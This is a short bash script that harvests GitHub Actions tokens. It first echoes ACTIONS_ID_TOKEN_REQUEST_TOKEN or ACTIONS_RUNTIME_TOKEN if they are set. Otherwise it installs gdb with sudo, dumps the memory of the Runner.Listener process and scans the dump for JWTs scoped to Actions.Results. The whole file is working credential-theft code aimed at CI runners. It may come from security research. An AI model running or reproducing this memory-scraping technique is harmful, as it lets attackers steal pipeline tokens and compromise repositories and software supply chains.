#!/bin/bash

if [[ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]]; then
   >&2 echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN present already"
   echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
   exit 0
fi

if [[ -n "$ACTIONS_RUNTIME_TOKEN" ]]; then
   >&2 echo "ACTIONS_RUNTIME_TOKEN present already"
   echo "$ACTIONS_RUNTIME_TOKEN"
   exit 0
fi


>&2 echo "Trying to extract it from the Runner's memory"

sudo apt -y install gdb >&2
scriptdir=$(realpath $(dirname $0))
(cd /tmp && sudo "$scriptdir/dump.sh" $(pidof Runner.Listener) >&2)
tokens="$(python3 ./idtoken_extractor.py /tmp)"

for token in $tokens; do
  if echo $token | cut -d. -f2 | base64 -d 2>/dev/null | jq .scp| grep Actions.Results >/dev/null 2>&1; then
     >&2 echo "Found!"
     echo $token
     exit 0
  fi
done

>&2 echo "Not found :("

exit 1
